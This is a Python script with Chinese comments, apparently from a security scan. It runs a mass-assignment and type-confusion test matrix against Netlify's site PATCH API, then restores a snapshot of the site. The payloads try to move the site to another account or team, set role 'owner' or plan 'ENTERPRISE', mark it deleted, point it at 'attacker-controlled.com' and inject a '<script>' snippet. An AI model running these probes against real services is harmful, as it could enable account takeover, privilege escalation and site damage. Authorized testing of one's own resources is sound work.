# -*- coding: utf-8 -*-
"""针对 PATCH /api/v1/sites/{id} 的 mass assignment + 类型混淆攻击矩阵
模式: 快照 GET -> PATCH 变异字段 -> GET 对比 -> 恢复
安全: 只操作自有站点 SITE_A; 破坏性字段(先快照后恢复)
"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, SITE_A

ctx = ssl.create_default_context()
API = 'api.netlify.com'
H = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
     'Accept': 'application/json', 'Authorization': 'Bearer ' + TOKEN_A,
     'Content-Type': 'application/json'}

def req(method, path, body=None, timeout=25):
    conn = http.client.HTTPSConnection(API, context=ctx, timeout=timeout)
    b = json.dumps(body).encode() if body is not None else None
    t0 = time.time()
    conn.request(method, path, body=b, headers=H)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    dt = time.time() - t0
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, dt, txt

# ---------- 0. 快照 ----------
st, dt, snap = req('GET', '/api/v1/sites/' + SITE_A)
print('snapshot GET:', st, '%.1fs' % dt, snap[:120])
S = json.loads(snap)
orig = {}
for k in ['name', 'custom_domain', 'account_id', 'account_slug', 'team_id', 'state',
          'site_capabilities', 'build_settings', 'plugins', 'publish_path', 'branch']:
    if k in S:
        orig[k] = S[k]
print('orig keys:', {k: (str(v)[:60]) for k, v in orig.items()})
print()

# ---------- 1. 基线: 合法 PATCH ----------
st, dt, b = req('PATCH', '/api/v1/sites/' + SITE_A, {'name': 'sec-test-rcf6lz'})
print('PATCH name(基线):', st, '%.1fs' % dt, b[:150])

# ---------- 2. mass assignment: 高敏字段 ----------
tests = [
    ('account_id',       '6a97b6454fef0db964f75db6'),   # B 的 account(转移?)
    ('account_slug',     'libobo01'),
    ('team_id',          '6a97b6454fef0db964f75db6'),
    ('state',            'deleted'),
    ('publish_path',     '/var/www'),
    ('branch',           'main'),
    ('site_capabilities', {'high_perf_adn': {'included': True}}),
    ('plan',             'ENTERPRISE'),
    ('ssl',              {'status': 'certified'}),
    ('custom_domain',    'attacker-controlled.com'),
    ('processing_settings', {'skip_processing': True}),
    ('build_settings',   {'stop_builds': True}),
    ('snippet',          {'title': 'x', 'general': '<script>'}),
    ('user_id',          '6a97b6454fef0db964f75db4'),
    ('role',             'owner'),
    ('unknown_field_xyz', 'abc'),
]
for field, val in tests:
    body = {field: val}
    st, dt, b = req('PATCH', '/api/v1/sites/' + SITE_A, body)
    flag = ''
    try:
        j = json.loads(b)
        if field in j:
            flag = ' <<< IN RESPONSE: %s' % str(j[field])[:80]
    except Exception:
        pass
    print('PATCH %-22s = %-45s %s %5.1fs | %s%s' % (field, str(val)[:44], st, dt, b[:120], flag))

# ---------- 3. 恢复快照 ----------
print()
restore = {k: v for k, v in orig.items()}
st, dt, b = req('PATCH', '/api/v1/sites/' + SITE_A, restore)
print('restore:', st, '%.1fs' % dt, b[:150])
st, dt, b = req('GET', '/api/v1/sites/' + SITE_A)
j = json.loads(b)
print('verify name=%s state=%s account=%s' % (j.get('name'), j.get('state'), j.get('account_slug')))
print('done')
